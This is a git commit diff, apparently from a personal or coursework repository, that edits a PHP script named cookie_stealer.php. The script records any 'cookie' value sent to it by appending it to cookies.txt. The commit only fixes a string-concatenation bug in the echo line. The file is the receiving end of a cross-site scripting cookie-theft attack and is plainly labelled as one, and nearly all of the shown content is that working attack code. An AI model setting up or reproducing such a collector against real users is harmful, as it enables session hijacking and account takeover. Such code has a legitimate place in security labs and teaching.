dc9810db0da8cf59046fd9aa346d9f0cd3e12b64
Nikolas Iliopoulos <nikolasil2000@gmail.com>
2022-05-09 22:00:25 +0300

    cookie stealer

--- puppies/cookie_stealer.php
+++ puppies/cookie_stealer.php
@@ -1,7 +1,7 @@
 <?php
 
 if (isset($_REQUEST["cookie"])) {
-  echo '1' + $_REQUEST["cookie"];
+  echo '1' . $_REQUEST["cookie"];
   $fp = fopen("cookies.txt", "a+");
   fwrite($fp, $_REQUEST["cookie"] . "\n");
   fclose($fp);
